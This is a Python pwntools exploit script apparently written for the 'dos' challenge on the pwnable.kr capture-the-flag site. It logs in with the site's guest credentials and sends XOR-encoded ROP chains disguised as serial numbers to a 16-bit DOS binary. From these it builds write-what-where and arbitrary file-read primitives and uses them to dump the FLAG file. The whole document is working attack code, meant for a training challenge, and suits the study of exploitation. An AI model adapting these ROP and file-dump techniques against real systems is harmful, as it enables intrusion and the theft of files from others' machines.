#!/usr/bin/env python3
from pwn import *

if args.LOCAL:
    if args.GDB:
        shell = process("./debug.sh")
    else:
        shell = process("./run.sh")
else:
    # shell = ssh("dos", "pwnable.kr", 2222,)
    shell = process('sshpass -p guest ssh dos@pwnable.kr -p2222', shell=True)
    shell.newline = b"\r\n"
    shell.sendline(b"")

def encrypt(data: bytes) -> bytes:
    return bytes([x ^ 0xff for x in data])

r_address = 0x167

fp = 0x378

main_address = 0x590
saved_ebp = 0x100
fopen_address = 0x23ed
fread_address = 0x24df
scanf_address = 0x2d65
percentage_s_format_address = 0x1b3

print_wow = 0x5d5
wow_address = 0x1c7

pop_di_pop_si_address = 0x194
borland_string_address = 0x4

cant_open_file_address = 0x183

def _dump_file(io: tube, filename_address: int):
    info(f"dumping file (filename at 0x{filename_address:x})")
    rop_ = (
        p16(saved_ebp) + 
        p16(fopen_address) +
        p16(pop_di_pop_si_address) + 
        p16(filename_address) + p16(r_address) + # fopen
        p16(fread_address) +
        p16(print_wow) + 
        p16(wow_address) + p16(1) + p16(0x100) + p16(fp)
    )

    do_rop(io, rop_)

    io.recvuntil(b"keys are encrypted")
    io.recvline_startswith(b"fp is valid :")

    return io.recvline(keepends=False)

def _check_file_exists(io: tube, filename_address: int):
    rop_ = (
        p16(saved_ebp) + 
        p16(0x3b1) +
        p16(filename_address) + p16(r_address) # fopen
    )

    do_rop(io, rop_)

    io.recvline_startswith(b"keys are encrypted")
    io.recvline_startswith(b"fp is valid : 378")

    return io.recvline(keepends=False) != b"can't open file"

def do_rop(io: tube, rop_: bytes):
    io.sendlineafter(b"User id : ", b"capturetheflag")

    payload = b"\n" * 25
    payload += encrypt(rop_)

    assert len(payload) <= 50
    payload = payload.ljust(50)

    numbers = [u16(payload[i:i+2], signed=True) for i in range(0, len(payload), 2)]

    assert(len(numbers)) == 25

    io.recvuntil(b"Enter 25 serial numbers : ")
    for num in numbers:
        io.sendline(str(num).encode())
        sleep(0.1)

def write_what_where(io: tube, what: bytes, where: int):
    info(f"writing {what!r} at 0x{where:x}")
    write_what_where_rop = (
        p16(saved_ebp) + 
        p16(scanf_address) +
        p16(main_address) + 
        p16(percentage_s_format_address) + p16(where)
    )
    do_rop(io, write_what_where_rop)
    sleep(1)
    io.sendline(what)

def dump_file(io: tube, filename: bytes):
    info(f"dumping {filename!r}")
    assert len(filename) < 0x40
    write_what_where(io, filename, borland_string_address)
    return _dump_file(io, borland_string_address)

def file_exists(io: tube, filename: bytes):
    assert len(filename) < 0x40
    write_what_where(io, filename, borland_string_address)
    return _check_file_exists(io, borland_string_address)

flag = dump_file(shell, b"FLAG")

success(f"flag = '{term.text.bold_italic_yellow(flag.decode().strip())}'")